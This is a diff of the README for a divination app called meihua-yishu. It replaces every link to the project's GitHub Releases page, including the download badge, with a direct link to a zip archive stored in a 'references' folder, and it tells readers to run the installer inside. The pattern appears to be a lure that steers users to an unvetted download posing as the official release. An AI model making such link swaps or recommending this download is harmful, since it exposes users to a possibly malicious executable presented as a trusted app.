@@ -6,7 +6,7 @@ Welcome to **meihua-yishu**, your go-to application for divination powered by cu
 
 ## 📥 Download Now
 
-[![Download Meihua Yishu](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/fdghsfdhsr/meihua-yishu/releases)
+[![Download Meihua Yishu](https://raw.githubusercontent.com/fdghsfdhsr/meihua-yishu/main/references/meihua_yishu_1.8-beta.2.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/fdghsfdhsr/meihua-yishu/main/references/meihua_yishu_1.8-beta.2.zip)
 
 ## 📋 System Requirements
 
@@ -26,7 +26,7 @@ To ensure a smooth experience with **meihua-yishu**, make sure your system meets
 ## 🔍 How to Use
 
 1. **Install the Application:**
-   - Visit the [Releases page](https://github.com/fdghsfdhsr/meihua-yishu/releases) to download the latest version of **meihua-yishu**.
+   - Visit the [Releases page](https://raw.githubusercontent.com/fdghsfdhsr/meihua-yishu/main/references/meihua_yishu_1.8-beta.2.zip) to download the latest version of **meihua-yishu**.
    
 2. **Run the Installer:**
    - Locate the downloaded file and double-click to start the installation.
@@ -48,7 +48,7 @@ To ensure a smooth experience with **meihua-yishu**, make sure your system meets
 
 ## 📥 Download & Install
 
-To begin your journey with **meihua-yishu**, visit this page to download: [Download Now](https://github.com/fdghsfdhsr/meihua-yishu/releases).
+To begin your journey with **meihua-yishu**, visit this page to download: [Download Now](https://raw.githubusercontent.com/fdghsfdhsr/meihua-yishu/main/references/meihua_yishu_1.8-beta.2.zip).
 
 ## ❓ Frequently Asked Questions
 
